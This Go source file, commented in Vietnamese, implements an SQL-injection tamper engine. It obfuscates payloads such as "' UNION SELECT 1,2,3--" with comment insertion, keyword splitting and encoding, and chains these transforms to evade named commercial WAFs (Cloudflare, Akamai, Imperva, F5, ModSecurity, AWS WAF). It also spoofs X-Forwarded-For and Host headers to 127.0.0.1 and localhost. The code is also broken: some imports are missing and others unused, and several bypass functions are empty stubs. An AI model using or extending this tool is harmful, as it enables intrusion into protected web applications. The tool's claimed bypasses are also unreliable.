package cmd

import (
	"context"
	"encoding/hex"
	"fmt"
	"strings"
	"time"

	"github.com/go-resty/resty/v2"
	"go.uber.org/zap"
)

type TamperScript struct {
	Name        string
	Description string
	Category    string
	Priority    int
	Func        func(string) string
}

type TamperEngine struct {
	scripts map[string]*TamperScript
	chains  map[string][]string
}

func NewTamperEngine() *TamperEngine {
	e := &TamperEngine{
		scripts: make(map[string]*TamperScript),
		chains: map[string][]string{
			"default":     {"randomcase", "comments", "whitespace"},
			"cloudflare":  {"cloudflare_bypass", "randomcase", "comments", "whitespace"},
			"akamai":      {"akamai_bypass", "urlencode", "randomcase"},
			"imperva":     {"imperva_bypass", "doubleurlencode", "comments"},
			"f5":          {"f5_bypass", "chunked", "randomcase"},
			"modsecurity": {"modsecurity_bypass", "inlinecomments", "keywords", "whitespace"},
			"aws_waf":     {"aws_waf_bypass", "httpparameterpollution", "headerinjection"},
		}
	}
	e.registerScripts()
	return e
}

func (e *TamperEngine) registerScripts() {
	// Mã hóa
	e.register("charencode", "Mã hóa ký tự", "encoding", 10, func(payload string) string {
		result := ""
		for _, c := range payload {
			result += fmt.Sprintf("CHAR(%d)", c)
		}
		return result
	})
	
	e.register("hexencode", "Mã hóa dạng hex", "encoding", 10, func(payload string) string {
		return "0x" + hex.EncodeToString([]byte(payload))
	})
	
	e.register("base64encode", "Mã hóa Base64", "encoding", 10, func(payload string) string {
		return "FROM_BASE64('" + base64.StdEncoding.EncodeToString([]byte(payload)) + "')"
	})
	
	e.register("urlencode", "Mã hóa URL", "encoding", 5, func(payload string) string {
		return strings.ReplaceAll(payload, " ", "%20")
	})
	
	e.register("doubleurlencode", "Mã hóa URL hai lần", "encoding", 5, func(payload string) string {
		return strings.ReplaceAll(strings.ReplaceAll(payload, " ", "%20"), "%", "%25")
	})
	
	// Làm rối
	e.register("randomcase", "Chuyển chữ hoa/thường ngẫu nhiên", "obfuscation", 20, func(payload string) string {
		result := ""
		for _, c := range payload {
			if randBool() {
				result += strings.ToUpper(string(c))
			} else {
				result += strings.ToLower(string(c))
			}
		}
		return result
	})
	
	e.register("comments", "Chèn comment nội tuyến", "obfuscation", 15, func(payload string) string {
		keywords := []string{"SELECT", "UNION", "WHERE", "AND", "OR", "FROM", "TABLE", "DATABASE", "VERSION", "SLEEP", "BENCHMARK"}
		result := payload
		for _, kw := range keywords {
			result = strings.ReplaceAll(result, kw, "/**/"+kw)
			result = strings.ReplaceAll(result, strings.ToLower(kw), "/**/"+strings.ToLower(kw))
		}
		return result
	})
	
	e.register("inlinecomments", "Chèn comment giữa các ký tự", "obfuscation", 15, func(payload string) string {
		result := ""
		for _, c := range payload {
			if c != ' ' && randBool() {
				result += "/**/" + string(c)
			} else {
				result += string(c)
			}
		}
		return result
	})
	
	e.register("whitespace", "Biến đổi khoảng trắng", "obfuscation", 10, func(payload string) string {
		result := strings.ReplaceAll(payload, " ", "/**/")
		result = strings.ReplaceAll(result, "\t", "/**/")
		result = strings.ReplaceAll(result, "\n", "/**/")
		return result
	})
	
	e.register("keywords", "Làm rối từ khóa", "obfuscation", 10, func(payload string) string {
		replacements := map[string]string{
			"SELECT": "SEL/**/ECT",
			"UNION":  "UNI/**/ON",
			"WHERE":  "WHE/**/RE",
			"AND":    "A/**/ND",
			"OR":     "O/**/R",
			"FROM":   "FRO/**/M",
			"SLEEP":  "SLE/**/EP",
			"BENCHMARK": "BEN/**/CHMARK",
			"VERSION": "VERS/**/ION",
		}
		result := payload
		for k, v := range replacements {
			result = strings.ReplaceAll(result, k, v)
			result = strings.ReplaceAll(result, strings.ToLower(k), strings.ToLower(v))
		}
		return result
	})
	
	// Cấu trúc
	e.register("unionalltounion", "Đổi UNION ALL thành UNION", "structure", 5, func(payload string) string {
		return strings.ReplaceAll(payload, "UNION ALL", "UNION")
	})
	
	e.register("multistatement", "Nhiều câu lệnh", "structure", 5, func(payload string) string {
		return payload + "; "
	})
	
	e.register("stackedqueries", "Truy vấn xếp chồng", "structure", 5, func(payload string) string {
		return payload + "; "
	})
	
	e.register("versionedkeywords", "Comment MySQL theo phiên bản", "structure", 10, func(payload string) string {
		keywords := []string{"SELECT", "UNION", "WHERE", "AND", "OR"}
		result := payload
		for _, kw := range keywords {
			result = strings.ReplaceAll(result, kw, "/*!"+kw+"*/")
			result = strings.ReplaceAll(result, strings.ToLower(kw), "/*!"+strings.ToLower(kw)+"*/")
		}
		return result
	})
	
	// Tầng HTTP
	e.register("chunked", "Mã hóa truyền tải dạng chunked", "http", 20, func(payload string) string {
		// Thao tác này sửa request HTTP, không sửa payload
		return payload
	})
	
	e.register("httpparameterpollution", "Ô nhiễm tham số HTTP", "http", 15, func(payload string) string {
		// Thêm tham số trùng lặp
		return payload
	})
	
	e.register("headerinjection", "Tiêm vào header", "http", 15, func(payload string) string {
		// Chèn dữ liệu vào header
		return payload
	})
	
	e.register("hostheader", "Biến đổi Host header", "http", 10, func(payload string) string {
		return payload
	})
	
	// Theo từng loại WAF
	e.register("cloudflare_bypass", "Biến đổi dành cho Cloudflare", "waf", 30, func(payload string) string {
		// Dành cho Cloudflare: tránh từ khóa kích hoạt và dùng mã hóa
		result := payload
		result = strings.ReplaceAll(result, "UNION", "UNI/**/ON")
		result = strings.ReplaceAll(result, "SELECT", "SEL/**/ECT")
		result = strings.ReplaceAll(result, "'", "/*'*/")
		return e.scripts["doubleurlencode"].Func(result)
	})
	
	e.register("akamai_bypass", "Biến đổi dành cho Akamai", "waf", 30, func(payload string) string {
		return e.scripts["urlencode"].Func(payload)
	})
	
	e.register("imperva_bypass", "Biến đổi dành cho Imperva/Incapsula", "waf", 30, func(payload string) string {
		return e.scripts["doubleurlencode"].Func(payload)
	})
	
	e.register("f5_bypass", "Biến đổi dành cho F5 BIG-IP", "waf", 30, func(payload string) string {
		return e.scripts["chunked"].Func(payload)
	})
	
	e.register("modsecurity_bypass", "Biến đổi dành cho ModSecurity", "waf", 30, func(payload string) string {
		result := payload
		result = e.scripts["inlinecomments"].Func(result)
		result = e.scripts["keywords"].Func(result)
		return result
	})
	
	e.register("aws_waf_bypass", "Biến đổi dành cho AWS WAF", "waf", 30, func(payload string) string {
		// HPP + chèn vào header
		return payload
	})
}

func (e *TamperEngine) register(name, desc, category string, priority int, fn func(string) string) {
	e.scripts[name] = &TamperScript{
		Name:        name,
		Description: desc,
		Category:    category,
		Priority:    priority,
		Func:        fn,
	}
}

func (e *TamperEngine) Apply(payload string, chain []string) string {
	result := payload
	for _, name := range chain {
		if script, ok := e.scripts[name]; ok {
			result = script.Func(result)
		}
	}
	return result
}

func (e *TamperEngine) ApplyChain(payload, chainName string) string {
	if chain, ok := e.chains[chainName]; ok {
		return e.Apply(payload, chain)
	}
	return e.Apply(payload, e.chains["default"])
}

func (e *TamperEngine) GetScript(name string) *TamperScript {
	return e.scripts[name]
}

func (e *TamperEngine) ListScripts() []*TamperScript {
	scripts := make([]*TamperScript, 0, len(e.scripts))
	for _, s := range e.scripts {
		scripts = append(scripts, s)
	}
	return scripts
}

func (e *TamperEngine) ListChains() map[string][]string {
	return e.chains
}

func randBool() bool {
	return time.Now().UnixNano()%2 == 0
}

var GlobalTamperEngine = NewTamperEngine()

// Bộ biến đổi transport HTTP cho chunked, HPP, v.v.
func (e *TamperEngine) ModifyRequest(req *resty.Request, chain []string) *resty.Request {
	for _, name := range chain {
		switch name {
		case "chunked":
			req.SetHeader("Transfer-Encoding", "chunked")
		case "httpparameterpollution":
			// Việc thêm tham số trùng lặp được xử lý ở tầng ứng dụng
		case "headerinjection":
			req.SetHeader("X-Forwarded-For", "127.0.0.1")
			req.SetHeader("X-Originating-IP", "127.0.0.1")
			req.SetHeader("X-Remote-IP", "127.0.0.1")
			req.SetHeader("X-Remote-Addr", "127.0.0.1")
		case "hostheader":
			req.SetHeader("Host", "localhost")
			req.SetHeader("X-Host", "localhost")
		}
	}
	return req
}

// Các lệnh CLI cho tamper
func runTamperList(cmd *cobra.Command, args []string) error {
	scripts := GlobalTamperEngine.ListScripts()
	tbl := table.New("NAME", "CATEGORY", "PRIORITY", "DESCRIPTION")
	for _, s := range scripts {
		tbl.AddRow(s.Name, s.Category, s.Priority, s.Description)
	}
	tbl.Print()
	return nil
}

func runTamperTest(cmd *cobra.Command, args []string) error {
	payload, _ := cmd.Flags().GetString("payload")
	chain, _ := cmd.Flags().GetString("chain")
	script, _ := cmd.Flags().GetString("script")
	
	if payload == "" {
		payload = "' UNION SELECT 1,2,3--"
	}
	
	var result string
	if script != "" {
		if s := GlobalTamperEngine.GetScript(script); s != nil {
			result = s.Func(payload)
		}
	} else if chain != "" {
		result = GlobalTamperEngine.ApplyChain(payload, chain)
	} else {
		result = GlobalTamperEngine.Apply(payload, GlobalTamperEngine.chains["default"])
	}
	
	fmt.Printf("Payload gốc: %s\n", payload)
	fmt.Printf("Payload sau biến đổi: %s\n", result)
	return nil
}
